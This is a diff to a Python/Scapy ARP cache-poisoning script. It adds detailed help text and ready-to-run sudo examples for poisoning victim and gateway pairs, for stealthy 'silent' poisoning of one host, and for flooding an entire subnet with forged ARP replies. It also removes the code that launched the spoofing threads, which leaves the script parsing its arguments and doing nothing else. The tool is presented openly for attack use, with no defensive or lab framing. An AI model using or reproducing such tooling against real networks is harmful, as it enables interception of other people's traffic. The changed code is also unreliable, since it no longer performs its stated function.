@@ -216,73 +216,68 @@ class PoisonManager(object):
         for t in self.threads:
             t.join()
 
-# ---------------------------------------------------------------------------
-# CLI
-# ---------------------------------------------------------------------------
-
 
 if __name__ == "__main__":
     import argparse
+    from textwrap import dedent
 
-    parser = argparse.ArgumentParser(description="ARP poisoning tool (Scapy, Py-2.7)")
-    parser.add_argument("--iface", "-i", required=True, help="Network interface")
+    parser = argparse.ArgumentParser(
+        prog="arp.py",
+        description="ARP cache–poisoning tool for Python-2.7 + Scapy 2.4.x\n"
+                    "(supports active pair, silent responder, and flood modes)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=dedent("""\
+            Examples
+            ---------
+            • Active pair attack (2 victims, 4-second refresh)
+              sudo python2 arp.py -i enp0s10 \
+                   --victims 10.0.123.4,10.0.123.7 \
+                   --gateway  10.0.123.1 \
+                   --interval 4
 
-    # pair / silent options
-    parser.add_argument("--victims", help="Comma-separated victim IPs (pair/silent)")
-    parser.add_argument("--gateway", help="Gateway IP (pair/silent)")
+            • Silent on-demand poisoning of a single host
+              sudo python2 arp.py -i enp0s10 \
+                   --mode silent \
+                   --victims 10.0.123.4 --gateway 10.0.123.1
 
-    # flood options
-    parser.add_argument("--cidr", help="CIDR to flood, e.g. 10.0.0.0/24")
+            • Flood entire /24 every 10 s
+              sudo python2 arp.py -i enp0s10 \
+                   --mode flood \
+                   --cidr 10.0.123.0/24 --gateway 10.0.123.1
+        """)
+    )
 
-    # common
-    parser.add_argument("--mode", choices=["pair", "flood", "silent"],
-                        default="pair")
-    parser.add_argument("--interval", type=float, default=10.0,
-                        help="Seconds between bursts (active modes)")
+    parser.add_argument(
+        "--mode", choices=["pair", "silent", "flood"], default="pair",
+        help="Operating mode:\n"
+             "  pair   – periodic poisoning of <victim, gateway> pairs (default)\n"
+             "  silent – only answer ARP 'who-has' requests, stealthy\n"
+             "  flood  – broadcast forged replies for an entire CIDR"
+    )
+
+    parser.add_argument(
+        "-i", "--iface", required=True,
+        help="Interface to send/receive raw Ethernet frames (e.g. enp0s10)"
+    )
+
+    parser.add_argument(
+        "--victims",
+        help="Comma-separated victim IPv4 list (required in pair/silent mode)"
+    )
+    parser.add_argument(
+        "--gateway",
+        help="Gateway (router) IPv4 address (required in pair/silent & flood)"
+    )
+
+    parser.add_argument(
+        "--cidr",
+        help="IPv4 CIDR to poison in flood mode, e.g. 192.168.1.0/24"
+    )
+
+    parser.add_argument(
+        "--interval", type=float, default=10.0,
+        help="Seconds between poison bursts (pair / flood). "
+             "Ignored in silent mode. Default: 10"
+    )
 
     args = parser.parse_args()
-
-    attacker_mac = get_if_hwaddr(args.iface)
-    mgr = PoisonManager()
-
-    try:
-        if args.mode in ("pair", "silent"):
-            if not (args.victims and args.gateway):
-                parser.error("--victims and --gateway required")
-
-            gateway_ip = args.gateway
-            gateway_mac = resolve_mac(gateway_ip)
-            victim_ips = [ip.strip() for ip in args.victims.split(",")]
-
-            for vip in victim_ips:
-                vmac = resolve_mac(vip)
-                if args.mode == "pair":
-                    thr = ActivePairSpoofer(args.iface,
-                                            (vip, vmac),
-                                            (gateway_ip, gateway_mac),
-                                            attacker_mac,
-                                            args.interval)
-                else:
-                    thr = SilentResponder(args.iface,
-                                          (vip, vmac),
-                                          (gateway_ip, gateway_mac),
-                                          attacker_mac)
-                mgr.add(thr)
-
-        elif args.mode == "flood":
-            if not (args.cidr and args.gateway):
-                parser.error("--cidr and --gateway required for flood mode")
-            thr = FloodSpoofer(args.iface, args.cidr, args.gateway,
-                               attacker_mac, args.interval)
-            mgr.add(thr)
-
-        # handle Ctrl-C
-        signal.signal(signal.SIGINT, mgr.stop_all)
-
-        # block until every thread exits
-        for t in mgr.threads:
-            t.join()
-
-    except Exception as exc:
-        log.error(str(exc))
-        mgr.stop_all()
